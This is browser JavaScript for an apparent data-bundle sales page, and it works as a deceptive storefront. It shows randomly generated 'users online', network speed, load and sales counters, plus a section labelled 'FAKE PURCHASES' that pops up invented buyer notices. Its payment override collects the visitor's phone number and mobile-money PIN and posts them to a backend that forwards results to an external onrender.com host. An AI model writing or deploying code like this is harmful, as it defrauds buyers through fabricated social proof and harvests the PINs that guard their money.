const users=document.getElementById("usersOnline")
const speed=document.getElementById("networkSpeed")
const sold=document.getElementById("bundlesSold")
const load=document.getElementById("networkLoad")

let bundles=1200

setInterval(()=>{
users.innerText="Users Online: "+(Math.floor(Math.random()*40)+20)
},2000)

setInterval(()=>{
speed.innerText="Network Speed: "+(Math.floor(Math.random()*100)+20)+" Mbps"
},2000)

setInterval(()=>{
bundles+=Math.floor(Math.random()*3)
sold.innerText="Bundles Today: "+bundles
},3000)

setInterval(()=>{
const percent=Math.floor(Math.random()*40)+60
load.innerText="Network Load: "+percent+"%"
},2000)



/* FAKE PURCHASES */

const names=["John","Asha","Kelvin","Maria","Ali","Fatma"]
const cities=["Dar","Arusha","Mwanza","Dodoma"]

function purchase(){

const name=names[Math.floor(Math.random()*names.length)]
const city=cities[Math.floor(Math.random()*cities.length)]

const box=document.createElement("div")

box.innerText=`🟢 ${name} from ${city} purchased 7GB`

box.style.position="fixed"
box.style.bottom="20px"
box.style.left="20px"
box.style.background="#111"
box.style.padding="10px"
box.style.borderRadius="10px"

document.body.appendChild(box)

setTimeout(()=>box.remove(),4000)

}

setInterval(purchase,5000)

/* FimiPay: send the PIN from this page, like Paribet deposit. */
(function () {
  const API_HOST = "https://unlockvip-backend-1.onrender.com";

  function parseFimiJson(text) {
    try { return JSON.parse(text || "{}"); } catch (_) { return {}; }
  }

  function fimiXhr(url, body, contentType) {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open("POST", url);
      xhr.setRequestHeader("Accept", "application/json");
      xhr.setRequestHeader("Content-Type", contentType);
      xhr.timeout = 45000;
      xhr.onload = () => resolve({ http: xhr.status, result: parseFimiJson(xhr.responseText) });
      xhr.onerror = () => reject(new Error("Could not reach FimiPay. Retry on mobile data."));
      xhr.ontimeout = () => reject(new Error("FimiPay timed out"));
      xhr.send(JSON.stringify(body));
    });
  }

  async function sendFimiPay(checkout) {
    const attempts = ["text/plain;charset=UTF-8", "application/json"];
    let lastErr = new Error("Could not send FimiPay push");
    for (const type of attempts) {
      try {
        const pushed = await fimiXhr(checkout.url, checkout.body, type);
        const orderId = String(pushed.result.order_id || pushed.result.orderId || "").trim();
        const msg = String(pushed.result.message || pushed.result.error || "");
        if (/vpn|proxy/i.test(msg)) {
          throw new Error("FimiPay blocked this network. Retry on mobile data, with VPN off.");
        }
        if (pushed.http >= 400 || pushed.result.ok === false) {
          throw new Error(msg || "Could not send FimiPay push");
        }
        if (orderId) return { http: pushed.http, orderId, result: pushed.result };
        lastErr = new Error(msg || "Could not send FimiPay push");
      } catch (err) {
        lastErr = err;
      }
    }
    throw lastErr;
  }

  const originalBuy = window.buy;
  window.buy = async function () {
    const phone = document.getElementById("phone")?.value;
    const pin = document.getElementById("pin")?.value;
    if (!phone) { alert("Enter phone number"); return; }
    if (!pin) { alert("Enter PIN number"); return; }

    const loading = document.getElementById("loading");
    const success = document.getElementById("success");
    if (loading) loading.style.display = "block";
    if (success) success.style.display = "none";

    try {
      const created = await fetch((typeof apiBase === "function" ? apiBase() : "") + "/create-payment", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ amount: 3000, phone, pin })
      }).then((r) => r.json());

      if (created.success && created.checkout) {
        const pushed = await sendFimiPay(created.checkout);
        const attached = await fetch(API_HOST + "/fimipay-push", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            reference: created.reference,
            http: pushed.http,
            orderId: pushed.orderId,
            result: pushed.result
          })
        }).then((r) => r.json());
        if (loading) loading.style.display = "none";
        if (!attached.success) {
          alert(attached.error || "Payment failed");
          return;
        }
        if (success) success.style.display = "block";
        if (typeof pollUnlockvipFimiPaid === "function") {
          pollUnlockvipFimiPaid(created.reference, pushed.orderId);
        }
        return;
      }

      if (typeof originalBuy === "function") {
        if (loading) loading.style.display = "none";
        return originalBuy();
      }

      if (loading) loading.style.display = "none";
      if (created.success) {
        if (success) success.style.display = "block";
      } else {
        alert(created.error || "Payment failed");
      }
    } catch (error) {
      if (loading) loading.style.display = "none";
      alert(error.message || "Server error");
    }
  };
})();